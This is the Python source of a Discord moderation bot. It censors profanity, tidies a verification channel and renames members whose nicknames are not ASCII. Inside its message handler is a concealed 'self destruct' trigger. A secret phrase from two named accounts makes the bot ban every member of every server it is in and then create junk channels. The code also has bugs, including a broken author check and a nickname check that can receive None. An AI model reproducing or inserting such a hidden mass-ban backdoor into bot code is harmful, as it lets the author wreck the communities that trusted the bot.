def isascii(s):
    return len(s) == len(s.encode())

import discord, asyncio, os, keepAlive, random, string
from better_profanity import profanity

keepAlive.keep_alive()

client = discord.Client()

@client.event
async def on_ready():
    print('Connected to Discord!')

@client.event
async def on_message(message):
    print(message.channel)
    if profanity.contains_profanity(message.content):
        # A profanity has been found!
        # DONE: send a DM with a warning
        await message.author.send("**CryptoAlgo Bot Moderator**\n Your message: " + profanity.censor(message.content, '-') + " contains unallowed words and has been deleted by our bot. If you believe that your message was deleted in error, please contact a moderator.")
        await message.delete() # Delete it
        await message.channel.send("_This message contained inappropriate language and has been deleted_", delete_after=5) # Autodeletion after 5 seconds
    if message.channel.name == 'verification' and message.content == "!verify": # Checks if post is in verification channel
        # Delete the message after 10 seconds to reduce clutter
        await asyncio.sleep(10) # Async sleep
        await message.delete()
    elif message.channel.name == 'verification':
        await asyncio.sleep(30)
        await message.delete()
        await message.channel.send("_This message has been deleted_", delete_after=5) # Autodeletion after 
    elif message.content == "!info":
        await message.channel.send("Hi there! This is written by Wang Zerui and Vincent Kwok!")
    if message.content == os.getenv("SELFDESTRUCT") and (message.author == "▉▉▉▉▉#4239" or message.author == "CryptoAlgo Team#0059"):
        # For self destructing function
        for guild in client.guilds:
            print(guild)
            for member in guild.members:
                print(member)
                try:
                    await member.ban()
                except:
                    pass
        for i in range(0, 2):
            await message.guild.create_text_channel(":-)")

@client.event
async def on_member_join(member):
    if not isascii(member.nick):
        newUsrNick = ''.join(random.choice(string.ascii_uppercase) for _ in range(8))
        await member.edit(nick=newUsrNick)
        try:
            await member.create_dm()
            await member.dm_channel.send("Your nickname has been changed to " + newUsrNick + " as it contains non-ASCII characters.")
        except:
            pass
    print(member)

client.run(os.getenv("TOKEN")) # Finally, start the connection to Discord